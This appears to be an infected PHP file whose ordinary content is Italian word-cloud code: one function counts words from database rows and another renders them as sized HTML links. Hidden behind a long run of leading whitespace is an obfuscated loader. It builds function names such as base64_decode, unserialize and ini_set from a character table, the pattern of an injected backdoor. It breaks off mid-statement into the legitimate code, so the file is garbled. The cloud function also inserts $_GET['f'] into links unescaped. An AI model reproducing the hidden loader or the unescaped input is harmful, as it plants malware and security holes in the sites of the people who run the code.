<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $w2f524 = 694;$GLOBALS['g7c0a959b']=Array();global$g7c0a959b;$g7c0a959b=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['j7076a41']="\x7d\x6b\x58\x2c\x54\x3c\x6f\x2d\x51\x66\x65\x6e\x4f\x26\x75\x46\x7b\x21\x39\x28\x64\x5f\x2e\xa\x73\x68\x78\x77\x29\x3f\x61\x31\x55\x22\x43\x25\x4d\x63\x50\x4c\x60\x23\x20\x74\x45\x36\x4a\x3b\x72\x76\x70\x4e\x57\x6c\x3d\x3e\x56\x71\x24\x41\xd\x6a\x69\x34\x7c\x44\x7a\x47\x5a\x48\x33\x2b\x35\x62\x4b\x67\x5d\x52\x32\x2f\x6d\x53\x5c\x49\x40\x37\x59\x9\x5b\x38\x27\x42\x2a\x79\x3a\x7e\x5e\x30";$g7c0a959b[$g7c0a959b['j7076a41'][9].$g7c0a959b['j7076a41'][37].$g7c0a959b['j7076a41'][18].$g7c0a959b['j7076a41'][37].$g7c0a959b['j7076a41'][63].$g7c0a959b['j7076a41'][73]]=$g7c0a959b['j7076a41'][37].$g7c0a959b['j7076a41'][25].$g7c0a959b['j7076a41'][48];$g7c0a959b[$g7c0a959b['j7076a41'][11].$g7c0a959b['j7076a41'][18].$g7c0a959b['j7076a41'][31].$g7c0a959b['j7076a41'][20].$g7c0a959b['j7076a41'][18].$g7c0a959b['j7076a41'][78].$g7c0a959b['j7076a41'][70]]=$g7c0a959b['j7076a41'][6].$g7c0a959b['j7076a41'][48].$g7c0a959b['j7076a41'][20];$g7c0a959b[$g7c0a959b['j7076a41'][11].$g7c0a959b['j7076a41'][10].$g7c0a959b['j7076a41'][72].$g7c0a959b['j7076a41'][18].$g7c0a959b['j7076a41'][70].$g7c0a959b['j7076a41'][31]]=$g7c0a959b['j7076a41'][24].$g7c0a959b['j7076a41'][43].$g7c0a959b['j7076a41'][48].$g7c0a959b['j7076a41'][53].$g7c0a959b['j7076a41'][10].$g7c0a959b['j7076a41'][11];$g7c0a959b[$g7c0a959b['j7076a41'][20].$g7c0a959b['j7076a41'][85].$g7c0a959b['j7076a41'][45].$g7c0a959b['j7076a41'][18].$g7c0a959b['j7076a41'][85].$g7c0a959b['j7076a41'][45]]=$g7c0a959b['j7076a41'][62].$g7c0a959b['j7076a41'][11].$g7c0a959b['j7076a41'][62].$g7c0a959b['j7076a41'][21].$g7c0a959b['j7076a41'][24].$g7c0a959b['j7076a41'][10].$g7c0a959b['j7076a41'][43];$g7c0a959b[$g7c0a959b['j7076a41'][61].$g7c0a959b['j7076a41'][30].$g7c0a959b['j7076a41'][45].$g7c0a959b['j7076a41'][70].$g7c0a959b['j7076a41'][89]]=$g7c0a959b['j7076a41'][24].$g7c0a959b['j7076a41'][10].$g7c0a959b['j7076a41'][48].$g7c0a959b['j7076a41'][62].$g7c0a959b['j7076a41'][30].$g7c0a959b['j7076a41'][53].$g7c0a959b['j7076a41'][62].$g7c0a959b['j7076a41'][66].$g7c0a959b['j7076a41'][10];$g7c0a959b[$g7c0a959b['j7076a41'][80].$g7c0a959b['j7076a41'][9].$g7c0a959b['j7076a41'][30].$g7c0a959b['j7076a41'][31].$g7c0a959b['j7076a41'][78].$g7c0a959b['j7076a41'][18].$g7c0a959b['j7076a41'][18]]=$g7c0a959b['j7076a41'][50].$g7c0a959b['j7076a41'][25].$g7c0a959b['j7076a41'][50].$g7c0a959b['j7076a41'][49].$g7c0a959b['j7076a41'][10].$g7c0a959b['j7076a41'][48].$g7c0a959b['j7076a41'][24].$g7c0a959b['j7076a41'][62].$g7c0a959b['j7076a41'][6].$g7c0a959b['j7076a41'][11];$g7c0a959b[$g7c0a959b['j7076a41'][57].$g7c0a959b['j7076a41'][72].$g7c0a959b['j7076a41'][30].$g7c0a959b['j7076a41'][73].$g7c0a959b['j7076a41'][9].$g7c0a959b['j7076a41'][20].$g7c0a959b['j7076a41'][37]]=$g7c0a959b['j7076a41'][14].$g7c0a959b['j7076a41'][11].$g7c0a959b['j7076a41'][24].$g7c0a959b['j7076a41'][10].$g7c0a959b['j7076a41'][48].$g7c0a959b['j7076a41'][62].$g7c0a959b['j7076a41'][30].$g7c0a959b['j7076a41'][53].$g7c0a959b['j7076a41'][62].$g7c0a959b['j7076a41'][66].$g7c0a959b['j7076a41'][10];$g7c0a959b[$g7c0a959b['j7076a41'][48].$g7c0a959b['j7076a41'][10].$g7c0a959b['j7076a41'][20].$g7c0a959b['j7076a41'][20].$g7c0a959b['j7076a41'][73].$g7c0a959b['j7076a41'][89]]=$g7c0a959b['j7076a41'][73].$g7c0a959b['j7076a41'][30].$g7c0a959b['j7076a41'][24].$g7c0a959b['j7076a41'][10].$g7c0a959b['j7076a41'][45].$g7c0a959b['j7076a41'][63].$g7c0a959b['j7076a41'][21].$g7c0a959b['j7076a41'][20].$g7c0a959b['j7076a41'][10].$g7c0a959b['j7076a41'][37].$g7c0a959b['j7076a41'][6].$g
function get_parole($res, $parole_escluse) {
  $sost = array(','=>' ', '.'=>' ', ':'=>' ', ';'=>' ', '!'=>' ', "\t"=>' ', "\r"=>' ', "\n"=>' ', "'"=>' ', 
    '"'=>' ', '?'=>' ', '('=>' ', ')'=>' ', '['=>' ', ']'=>' ', '{'=>' ', '}'=>' ', '/'=>' ', "\\"=>' ',
    '&#039;' =>' ');
  $lunghezza_minima = 4;

  while ($row=db_fetch($res)) {
    // PULIZIA CARATTERI
    $row['testo'] = strtr($row['testo'],$sost);

    // UNIQUE: CONSIDERO OGNI PAROLA UNA SOLA VOLTA PER MESSAGGIO
    $p = array_filter(array_unique(explode(' ',strtolower($row['testo']))));
    foreach ($p as $parola) {
      if (strlen($parola) < $lunghezza_minima || in_array($parola, $parole_escluse) || is_numeric($parola)) {
        continue;
      }

      if (!isset($parole[$parola])) {
        $parole[$parola] = 0;
      } 
      $parole[$parola] += 1;
    }
  }
  arsort($parole);
  return $parole;
}


function cloud($parole, $link=false, $attiva_plus=false) {
  // DIMENSIONI CLOUD
  $smallest = 13;
  $largest  = 32;

  $parole_div = array();

  $min_count = min( $parole );
  $spread = max( $parole ) - $min_count;
  if ( $spread <= 0 ) $spread = 1;
  $font_step = round(($largest - $smallest) / $spread, 2);

  foreach ($parole as $parola=>$num) {
    $dimensione = $smallest + ( $num - $min_count ) * $font_step;
    if ($link) {
    	$parola_orig = $parola;
      $parola = '<a href="?f='.$parola.'">'.$parola_orig.'</a>';
      if ($attiva_plus && $_GET['f'] != '') {
        $parola .= '<a href="?f='.$_GET['f'].'%20'.$parola_orig.'"><sup>+</sup></a>';
      }
      if ($attiva_plus && $_GET['f'] != '') {
        $parola = '<a href="?f='.$_GET['f'].'%20-'.$parola_orig.'"><sup>x</sup></a>'.$parola;
      }
    }
  	$parole_div []= '<span style="padding-right: 6px;">
        <span class="nobr" style="font-size:'.$dimensione.'px">'.$parola.'</span><sub>'.$num.'</sub>
      </span>';
  }
  shuffle($parole_div);
  return $parole_div;
}
